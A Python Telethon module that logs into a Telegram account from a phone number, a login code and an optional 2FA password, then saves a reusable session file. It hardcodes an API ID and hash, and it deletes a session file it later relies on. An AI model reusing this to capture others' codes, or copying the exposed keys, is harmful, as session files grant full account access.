from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import asyncio
import os
import tempfile
import secrets
import string
from typing import Dict, Any, Optional

API_ID = '25170767'
API_HASH = 'd512fd74809a4ca3cd59078eef73afcd'


async def send_code_request(phone_number: str) -> Dict[str, Any]:
    """
    Send OTP code request to the phone number.
    
    Args:
        phone_number: Phone number with country code (e.g., +1234567890)
    
    Returns:
        Dict with phone_code_hash or error
    """
    # Generate random session filename in temp directory
    temp_dir = tempfile.gettempdir()
    random_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(16))
    session_path = os.path.join(temp_dir, random_name)
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Send code request - OTP will be received on Telegram
        sent_code = await client.send_code_request(phone_number)
        
        await client.disconnect()
        
        # Delete the temporary session file
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        
        return {
            "success": True,
            "phone_code_hash": sent_code.phone_code_hash,
            "phone": phone_number,
            "session_path": session_path  # Return session path for next step
        }
        
    except errors.PhoneNumberInvalidError:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        return {
            "success": False,
            "error": "Invalid phone number format"
        }
        
    except errors.PhoneNumberFloodError:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        return {
            "success": False,
            "error": "Too many requests. Please try again later."
        }
        
    except errors.PhoneNumberBannedError:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        return {
            "success": False,
            "error": "Phone number is banned"
        }
        
    except Exception as e:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        error_msg = str(e)
        if "flood" in error_msg.lower():
            return {
                "success": False,
                "error": "Too many requests. Please wait before trying again."
            }
        return {
            "success": False,
            "error": f"Failed to send code: {error_msg}"
        }


async def verify_otp_and_create_session(
    phone_number: str,
    phone_code_hash: str,
    otp_code: str,
    session_path: str,
    custom_filename: Optional[str] = None,
    use_random_filename: bool = False
) -> Dict[str, Any]:
    """
    Verify OTP code and create session file.
    Handles 2FA if required.
    
    Args:
        phone_number: Phone number with country code
        phone_code_hash: Hash from send_code_request
        otp_code: OTP code entered by user (NOT stored or logged)
        session_path: Path to session file (without .session extension)
        custom_filename: Custom filename for session (without .session extension)
        use_random_filename: If True, use random filename instead of custom
    
    Returns:
        Dict with session file path or error. If 2FA required, returns needs_2fa=True.
    """
    # Clean OTP code - remove any whitespace
    otp_code = otp_code.strip()
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Sign in with OTP code
        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
        except errors.SessionPasswordNeededError:
            # 2FA is enabled - return indication that 2FA password is needed
            await client.disconnect()
            return {
                "success": False,
                "needs_2fa": True,
                "session_path": session_path,
                "phone": phone_number
            }
        except errors.PhoneCodeInvalidError:
            await client.disconnect()
            try:
                if os.path.exists(session_path + '.session'):
                    os.remove(session_path + '.session')
            except:
                pass
            return {
                "success": False,
                "error": "Invalid OTP code. Please check and try again."
            }
        except errors.PhoneCodeExpiredError:
            await client.disconnect()
            try:
                if os.path.exists(session_path + '.session'):
                    os.remove(session_path + '.session')
            except:
                pass
            return {
                "success": False,
                "error": "OTP code has expired. Please request a new code."
            }
        except errors.FloodWaitError as e:
            await client.disconnect()
            try:
                if os.path.exists(session_path + '.session'):
                    os.remove(session_path + '.session')
            except:
                pass
            wait_time = e.seconds
            return {
                "success": False,
                "error": f"Too many attempts. Please wait {wait_time} seconds before trying again."
            }
        
        # Successfully signed in - session file is created
        await client.disconnect()
        
        # Determine final filename
        if use_random_filename:
            random_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(16))
            final_filename = random_name
        elif custom_filename:
            # Sanitize filename
            final_filename = "".join(c for c in custom_filename if c.isalnum() or c in ('-', '_')).strip()
            if not final_filename:
                final_filename = phone_number.replace('+', '').replace('-', '').replace(' ', '')
        else:
            final_filename = phone_number.replace('+', '').replace('-', '').replace(' ', '')
        
        # Move session file to final location if needed
        original_session_file = session_path + '.session'
        final_session_file = os.path.join(tempfile.gettempdir(), final_filename + '.session')
        
        if original_session_file != final_session_file:
            if os.path.exists(original_session_file):
                try:
                    if os.path.exists(final_session_file):
                        os.remove(final_session_file)
                    os.rename(original_session_file, final_session_file)
                except Exception as e:
                    # If rename fails, just use the original
                    final_session_file = original_session_file
        else:
            final_session_file = original_session_file
        
        return {
            "success": True,
            "session_path": final_session_file,
            "filename": final_filename,
            "message": "Session created successfully"
        }
        
    except Exception as e:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        error_msg = str(e)
        if "flood" in error_msg.lower():
            return {
                "success": False,
                "error": "Too many requests. Please wait before trying again."
            }
        return {
            "success": False,
            "error": f"Verification failed: {error_msg}"
        }


async def verify_2fa_and_finalize_session(
    session_path: str,
    password_2fa: str,
    custom_filename: Optional[str] = None,
    use_random_filename: bool = False
) -> Dict[str, Any]:
    """
    Verify 2FA password and finalize session creation.
    
    Args:
        session_path: Path to session file (without .session extension)
        password_2fa: 2FA password (NOT stored or logged)
        custom_filename: Custom filename for session (without .session extension)
        use_random_filename: If True, use random filename instead of custom
    
    Returns:
        Dict with session file path or error
    """
    # Clean password - remove any whitespace
    password_2fa = password_2fa.strip()
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Get password
        try:
            password_hint = await client.get_password()
        except Exception as e:
            await client.disconnect()
            try:
                if os.path.exists(session_path + '.session'):
                    os.remove(session_path + '.session')
            except:
                pass
            return {
                "success": False,
                "error": f"Failed to get password info: {str(e)}"
            }
        
        # Sign in with 2FA password
        try:
            await client.sign_in(password=password_2fa)
        except errors.PasswordHashInvalidError:
            await client.disconnect()
            try:
                if os.path.exists(session_path + '.session'):
                    os.remove(session_path + '.session')
            except:
                pass
            return {
                "success": False,
                "error": "Invalid 2FA password. Please try again."
            }
        
        # Successfully signed in - session file is created
        await client.disconnect()
        
        # Get phone number for filename if custom not provided
        phone_number = ""
        try:
            temp_client = TelegramClient(session_path, API_ID, API_HASH)
            await temp_client.connect()
            if await temp_client.is_user_authorized():
                me = await temp_client.get_me()
                phone_number = me.phone or ""
            await temp_client.disconnect()
        except:
            pass
        
        # Determine final filename
        if use_random_filename:
            random_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(16))
            final_filename = random_name
        elif custom_filename:
            # Sanitize filename
            final_filename = "".join(c for c in custom_filename if c.isalnum() or c in ('-', '_')).strip()
            if not final_filename:
                final_filename = phone_number.replace('+', '').replace('-', '').replace(' ', '') if phone_number else "session"
        else:
            final_filename = phone_number.replace('+', '').replace('-', '').replace(' ', '') if phone_number else "session"
        
        # Move session file to final location if needed
        original_session_file = session_path + '.session'
        final_session_file = os.path.join(tempfile.gettempdir(), final_filename + '.session')
        
        if original_session_file != final_session_file:
            if os.path.exists(original_session_file):
                try:
                    if os.path.exists(final_session_file):
                        os.remove(final_session_file)
                    os.rename(original_session_file, final_session_file)
                except Exception as e:
                    # If rename fails, just use the original
                    final_session_file = original_session_file
        else:
            final_session_file = original_session_file
        
        return {
            "success": True,
            "session_path": final_session_file,
            "filename": final_filename,
            "message": "Session created successfully with 2FA"
        }
        
    except Exception as e:
        try:
            await client.disconnect()
        except:
            pass
        try:
            if os.path.exists(session_path + '.session'):
                os.remove(session_path + '.session')
        except:
            pass
        error_msg = str(e)
        if "flood" in error_msg.lower():
            return {
                "success": False,
                "error": "Too many requests. Please wait before trying again."
            }
        return {
            "success": False,
            "error": f"2FA verification failed: {error_msg}"
        }

